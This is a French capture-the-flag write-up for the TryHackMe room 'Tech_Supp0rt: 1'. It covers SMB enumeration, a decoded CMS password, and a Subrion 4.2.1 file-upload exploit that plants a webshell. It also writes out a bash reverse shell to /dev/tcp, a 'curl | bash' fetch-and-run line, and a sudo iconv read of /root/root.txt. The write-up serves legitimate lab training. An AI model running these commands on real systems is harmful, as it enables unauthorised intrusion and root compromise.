---
title: "TryHackMe Room techsupp0rt1"
seoTitle: "TechSupp0rt1 Room Guide | TryHackMe"
seoDescription: "Use Nmap, smbclient, and CyberChef in TryHackMe's TechSupp0rt1 room to uncover hidden pages, crack passwords, and access secure interfaces"
datePublished: Thu May 08 2025 00:53:08 GMT+0000 (Coordinated Universal Time)
cuid: cmaenldid00010al2dp4l662b
slug: tryhackme-room-techsupp0rt1
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1746668322615/de919d57-32cb-407b-8330-442a0f9a48ff.png
tags: tryhackme, thm, thm-presecurity-path, thm-writeup, tryhackme-walkthrough, thm-room

---

Lien de la room: [TryHackMe | Tech\_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1)

# Énumération

Le scan Nmap nous donne le résultat suivant.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746657858268/39c10e19-a6a1-4afa-b0fa-fd87db0a3fe1.png align="center")

Rien d’extraordinaire

On essaie le port 80 et on tombe sur la page par défaut Ubuntu

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746662422650/7f4fa8e5-4374-4c0e-84f0-6253637c56cd.png align="center")

La recherche par gobuster nous donne deux pages plutôt intéressantes: `http://10.10.74.44/wordpress/` et `http://10.10.74.44/test/`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746658876068/6bec499c-551a-496d-8d06-7cf1a7998a57.png align="center")

La page `http://10.10.74.44/test/` semble être une page malveillante avec beaucoup de pop-ups.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746658860501/e7efa3d5-8dbe-48f2-8e6d-924ef1d7127d.png align="center")

La page `http://10.10.74.44/wordpress/` semble être une page normal avec quelques codes d’erreur 404.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746659483105/86549896-97e0-47bc-9c8a-76c356bdb2d4.png align="center")

En parcourant un peu le site, on tombe sur un lien, qui nous dirige vers uns adresse différente que celle de base. En la modifiant pour celle de l’adresse IP de la cible de base, on tombe sur une page d’authenfication WordPress

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746661251899/197acfd7-d2d4-40fc-83cb-bfd767aef07e.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746661266977/735fa90e-1373-4875-b7b6-97ea3960c5ec.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746661353771/6905a6e8-0c22-4f38-a8bd-5f4a43a9c278.png align="center")

Après avoir tenté quelques combinaisons et de l’injection SQL, rien d’intéressant ici pour le moment.

Vu que les ports 139 et 445 sont ouverts, on utilise smbclient pour interagir avec les serveurs Samba et accéder potentiellement à des partages de fichiers.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746659959767/d4e77b37-42d9-41b9-8aa9-070d160863bd.png align="center")

On voit trois partages disponibles. Les partages avec $ à la fin indiquent qu’ils sont cachés et ne sont pas visibles par tous. On peut donc accéder à `\\10.10.74.44\websvr`.

On accède au partage et on y voit un fichier `enter.txt` qu’on récupère sur notre machine.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746660499820/2f6d404b-c557-4f8c-82e2-5b81781f8636.png align="center")

Ce fichier contient des informations assez utiles, dont la possibilité de l’existence de Subrion, un système de gestion de contenu (CMS) et des identifiants de connexion.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746660515401/334e1d2b-6eb8-4af7-b7ae-4e062bc2f318.png align="center")

On peut peut-être s’en servir pour se connecter à une interface?

Après une petite recherche google sur Subrion, on peut tester les panneaux d’administration Subrion aux addresses http://10.10.74.44/subrion, http://10.10.74.44/subrion/panel ou encore http://10.10.74.44/subrion/admin.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746662798301/893ea53c-2316-4917-8085-46be5943c743.png align="center")

Après avoir testé les identifiants trouvés un peu plus haut, on a un message d’erreur au niveau de l’authentification.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746662918875/b66feb25-856a-4231-8bb5-fb0a53ee47cf.png align="center")

Vu qu’on avait une note `[cooked with magical formula]`, cela indique que le mot de passe est à décoder probablement. Je me rends donc sur [https://www.dcode.fr/fr](https://www.dcode.fr/fr), au niveau du détecteur de chiffrement en premier.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746663134990/06ad04a7-e56b-4777-bb42-e11ad7ad1a04.png align="center")

On voit une indication d’un chiffrement en Base 58. En l’utilisant sur CyberChef on voit le mot de passe en clair.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746663521268/c1aac50f-d459-4e3e-abf2-c9c495cb24a7.png align="center")

On a accès à l’interface de Subrion.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746663708953/08539d71-e214-426e-8ed6-58f323ae9549.png align="center")

En parcourant un peu le dahsboard, on a juste pas mal d’informations. Aucun mot de passe en clair, ou une indication sur tel ou tel indice.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746665885789/3fa09279-4004-4807-92fd-5276c78f3f78.png align="center")

On voit par contre la version du CMS qui est la 4.2.1.

En recherchant sur [https://www.exploit-db.com/](https://www.exploit-db.com/), on a quelques vulnérabilités de cette version ainsi que les CVEs.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746665937024/b9626217-9044-49ed-8cf9-1afba700374d.png align="center")

Après avoir fouillé un peu, on peut tirer parti de la vulnérabilité `Arbitrary File Upload` de Subrion 4.2.1 pour déposer un shell et potentiellement obtenir un accès.

On se rend dans `msfconsole` ensuite, pour récupérer et adapter l’exploit avec la commande `searchsploit -m php/webapps/49876.py`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746666647564/fc52efa6-d180-47a8-b9ed-ac8d2b40a3ec.png align="center")

Le fichier est maintenant téléchargé. La prochaine étape est de le consulter et voir ce que fait le contenu.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746666738937/a2e81b6d-080e-46b7-bfa4-1a012b67984b.png align="center")

Le script utilise `optparse` pour gérer les arguments. On peut donc ajouter les trois options `-u` pour l’URL cible, `-l` pour le nom d’utilisateur et `-p` pour le mot de passe.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746667078187/78cfc61a-03da-44db-9e8d-4399a03bba73.png align="center")

Après avoir lancé l’exploit avec les bon paramètres, on est maintenant connecté sur la machine avec `www-data`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746708238843/c4b8f267-2b18-4282-85da-245232b85736.png align="center")

On voit bien que l’exploit a uploadé un webshell à l’adresse `http://10.10.123.58/subrion/panel/uploads/lpfotmxhylzwuss.phar`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746708586982/4d34069b-aa48-459c-9629-23fc4c0db706.png align="center")

Ce webshell (lpfotmxhylzwuss.phar) permet d’exécuter des commandes à distance via des requêtes HTTP, en PHP ici.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746708778813/e1246df7-40be-465f-9f62-f096879231c0.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746711106011/6aef2822-d97a-44a5-b347-c8fe6c728dc4.png align="center")

L’exploit `49876.py` ici permet d’exécuter des commandes sur le serveur , mais il est limité au répertoire `/var/www/html/subrion/uploads`. Même lorsqu’on fait cd /, on se trouve toujours dans le répertoire `/var/www/html/subrion/uploads`.

Le webshell `lpfotmxhylzwuss.phar` est limité, on a pas de changement de répertoire. Il faut donc trouver un moyen d’avoir un shell interactif.

On va donc tenter d’obtenir un reverse shell, en y envoyant un payload qui se connecte à notre machine.

```bash
nano revshell.sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.12.49/4444 0>&1
```

Ce code va créer un reverse shell vers notre machine. La prochaine étape serait de lancer un écouteur sur notre machine avec la commande `nc -lvnp 4444` puis récupérer le fichier `revshell.sh` depuis le serveur subrion. La commande bash exécute le script téléchargé.

```bash
curl 10.10.12.49:8000/revshell.sh | bash
```

On a donc réussi à avoir le shell.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746710367088/77189810-6950-489b-8dff-8dd943b040c2.png align="center")

On peut voir ici qu’il y a un utilisateur du nom de `scamsite`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746712841987/cadd4b0f-eb15-4599-b669-b339e5f5e545.png align="center")

Le fameux répertoire `/test` sort aussi des fichiers assez bizzares

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746712954724/a93f4b00-487f-4bfa-acd5-fb68f62b2c67.png align="center")

Dans le répertoire `/wordpress`, on voit un fichier `wp-config.php`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746713013198/f3a5307b-0270-4d1e-a984-1897653a5eaf.png align="center")

Bingo, dans ce fichier, on a des identifiants MySQL. Il peut s’agir d’identifiants pour accéder à une base de données WordPress? SSH? ou autre.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746713095613/0e03a28e-a281-4c75-a10e-b5dfbef2c268.png align="center")

La tentative de se connecter à mysql a pas marché.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746713881270/2cd2d0a8-a3ef-4f9f-987b-c74ab30b1ce0.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746714225046/fffeedf5-13e0-4c56-ad6a-7f7d26b33c0e.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746714262641/93ce73ff-6ba7-40d1-a40a-68cf1862b54b.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746714493855/a4553fe0-70af-4031-b464-84a03b6f7484.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746714722438/2d56c010-c57c-4f76-8c4d-2b7eca78bcb3.png align="center")

La commande `sudo -l` afficher les commandes privilèges que l’utilisateur `scamsite` peut exécuter via sudo.

On voit qu’il peut exécuter `usr/bin/iconv` en tant que `root`sans mot de passe. Après quelques recherches rapides, `iconv` est un utilitaire pour convertir des encodages de fichiers.

On exécute la commande `sudo iconv -f utf-8 -t utf-8 /root/root.txt` et on a le flag 😉.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746715442612/8dbd64ef-7a80-4531-acdb-4136ad67dd82.png align="center")